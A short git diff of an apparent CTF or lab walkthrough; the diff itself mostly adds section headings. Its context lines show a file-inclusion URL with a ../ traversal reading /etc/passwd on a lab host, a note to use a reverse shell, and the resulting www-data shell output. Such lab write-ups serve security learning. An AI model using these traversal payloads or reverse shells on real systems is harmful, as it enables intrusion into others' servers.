@@ -397,7 +397,11 @@ Confirm the [25971 exploit](https://www.exploit-db.com/exploits/25971)
 |:--:|
 | http://10.10.56.232/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?<br>urlConfig=../../../../../../../../../etc/passwd |
 
-It is vulnerable to Remote File Inclusion. Use a reverse shell.
+It is vulnerable to Remote File Inclusion. 
+
+### Exploit Remote File Inclusion
+
+Use a reverse shell.
 
 Start a listener:
 
@@ -432,6 +436,8 @@ And connection:
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
     /bin/sh: 0: can't access tty; job control turned off
     $
+
+### Privilege escalation
 
 Explore:
 
